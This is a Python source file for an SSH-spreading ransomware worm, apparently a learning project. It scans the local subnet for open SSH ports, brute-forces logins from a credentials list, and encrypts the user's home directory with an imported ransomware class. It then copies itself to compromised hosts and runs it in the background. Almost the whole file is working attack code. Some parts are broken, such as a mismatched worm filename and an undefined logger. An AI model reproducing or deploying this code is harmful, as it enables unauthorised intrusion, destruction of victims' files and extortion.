import sys
import paramiko
import tarfile
import socket
import nmap
import os
from os.path import expanduser
import struct
import msvcrt
import netifaces
import urllib
import shutil
from subprocess import call
from RSARansomware import RSARansomware
import argparse

credentials = "credentials.txt"
ssh_client = paramiko.SSHClient()
infection_marker = "infected.txt"


def checkForInfection(ssh_object):
    try:
        sftp_client = ssh_object.open_sftp()
        sftp_client.stat(infection_marker)
        return True
    except:
        return False


def markAsInfected():
    global infection_marker
    infection_file_object = open(infection_marker, "w")
    infection_file_object.write("ALL YOUR BASE ARE BELONG TO US!")
    infection_file_object.close


def spreadAndExecute(ssh_object):
    worm_location = "/tmp/babys_first_ransomware.py"
    if len(sys.argv) >= 2:
        if sys.argv[1] == "--host":
            worm_location = "babys_first_ransomware.py"
    sftp_client = ssh_object.open_sftp()
    sftp_client.put(worm_location, "/tmp/babys_first_ransomware.py")
    ssh_object.exec_command("chmod a+x /tmp/babys_first_ransomware.py")
    ssh_object.exec_command("nohup python /tmp/extorter_worm.py &")


def tryCredentials(host, user_name, pass_word, ssh_object):
    try:
        ssh_object.connect(host, username=user_name, password=pass_word)
        return 0
    except paramiko.ssh_exception.AuthenticationException:
        return 1
    except socket.error:
        return 3


def attackHost(ipAddress):
    global credentials
    global ssh_client
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for line in open(credentials, "r").readlines():
        [username, password] = line.strip().split()
        if tryCredentials(ipAddress, username, password, ssh_client) == 0:
            print(f"SUCCESSFUL INFILTRATION OF {ipAddress} USER: {username} + PASSWORD: {password}")
            return (ssh_client, username, password)
        elif tryCredentials(ipAddress, username, password, ssh_client) == 1:
            print(f"WRONG CREDENTIALS ON HOST {ipAddress}")
            continue
        elif tryCredentials(ipAddress, username, password, ssh_client) == 3:
            print(f"NO SSH CLIENT ON {ipAddress}")
            break
    return None


def myIpAddress():
    local_host = '127.0.0.1'
    gateway = netifaces.gateways()
    try:
        interface = gateway['default'][netifaces.AF_INET][1]
    except (KeyError, IndexError):
        LOG.info(_LI(f"Could not determine defualt network interface, using {local_host} for IPv4 address"))
        return local_host
    try:
        return netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']
    except (KeyError, IndexError):
        LOG.info(_LI(f"Could not determine IPv4 address for interface {interface}, using {local_host} for IPv4 address "))
    except Exception as err:
        LOG.info(_LI(f"Could not determine IPv4 address for interface {interface}, error: {err}"))
    return local_host


def hostsOnTheNetwork():
    port_scanner = nmap.PortScanner()
    port_scanner.scan('192.168.1.0/24', arguments='-p -22 --open')
    host_information = port_scanner.all_hosts()
    live_hosts = []
    my_host_address = myIpAddress()
    for host in host_information:
        if port_scanner[host].state() == "up" and host != my_host_address:
            live_hosts.append(host)
    return live_hosts


def crypt_files():
    system_root = expanduser('~')

    ransomware = RSARansomware()
    ransomware.generate_aes_key()
    ransomware.write_aes_key('keyfile')
    ransomware.crypt_root(system_root)


if __name__ == '__main__':

    # Worm finds hosts on the network
    network_hosts = hostsOnTheNetwork()
    print(network_hosts)

    # Worm checks if it has already infected a host
    # If the host is not infected, it infects the host with the infection marker
    # If the host is infected, it exits the host
    if not os.path.exists(infection_marker):
        markAsInfected()
    else:
        print("ALREADY INFECTED")
        #os._exit(1)

    if len(sys.argv) >= 2:
        print("This is the host, do not encrypt")
    else:
        crypt_files()

    # Goes through the network hosts and attempts to brute force ssh
    # Prints the result of the attack and confirms if attack succeeded
    for host in network_hosts:
        ssh_attack = attackHost(host)
        print(ssh_attack)

        if ssh_attack:
            print("Trying to spread")
            if checkForInfection(ssh_attack[0]) == True:
                print("REMOTE SYSTEM IS INFECTED")
                continue
            else:
                spreadAndExecute(ssh_attack[0])
                print(f"SPREADING COMPLETE ON {host}")
                sys.exit()
